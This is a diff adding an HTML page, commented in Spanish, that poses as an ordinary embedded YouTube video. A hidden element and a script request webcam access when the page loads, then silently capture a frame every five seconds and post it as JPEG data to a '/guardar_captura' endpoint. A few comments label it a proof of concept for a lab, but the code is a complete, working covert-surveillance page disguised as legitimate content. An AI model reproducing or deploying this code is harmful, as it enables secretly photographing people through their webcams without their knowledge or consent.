@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Simulación de Contenido Legítimo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #111; /* Fondo oscuro para simular entorno de video */
+            color: #fff;
+            text-align: center;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 854px;
+        }
+        /* El único elemento visible para el usuario es el contenedor del vídeo */
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%; /* Relación de aspecto 16:9 */
+            height: 0;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            background-color: #000;
+        }
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* ELEMENTOS DE LA POC COMPLETAMENTE OCULTOS:
+           El usuario no sabe que estos componentes existen en el DOM de la página.
+        */
+        #stealth-area {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="video-container">
+            <iframe 
+                src="https://www.youtube.com/embed/TU_ID_DE_VIDEO?autoplay=1" 
+                title="Reproductor de Video" 
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                allowfullscreen>
+            </iframe>
+        </div>
+    </div>
+
+    <div id="stealth-area">
+        <video id="webcam" autoplay playsinline muted></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+
+    <script>
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Solicitar los permisos en segundo plano al cargar el sitio
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(function(stream) {
+                video.srcObject = stream;
+                
+                // Iniciar exfiltración silenciosa cada 5 segundos hacia el backend
+                setInterval(exfiltrarSilencioso, 5000);
+            })
+            .catch(function(err) {
+                // Falla silenciosa en producción, logueada para el laboratorio
+                console.log("Permiso denegado por el usuario.");
+            });
+
+        function exfiltrarSilencioso() {
+            if (video.srcObject) {
+                // Capturar el fotograma actual del flujo oculto en el canvas no renderizado
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataURL = canvas.toDataURL('image/jpeg');
+
+                // Enviar la información al servidor de forma asíncrona (invisible para la interfaz)
+                fetch('/guardar_captura', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ imagen: dataURL })
+                })
+                .then(response => response.json())
+                .then(data => console.log("[PoC] Sincronización en segundo plano exitosa."))
+                .catch(error => console.error("[PoC] Error en comunicación de fondo."));
+            }
+        }
+    </script>
+</body>
+</html>
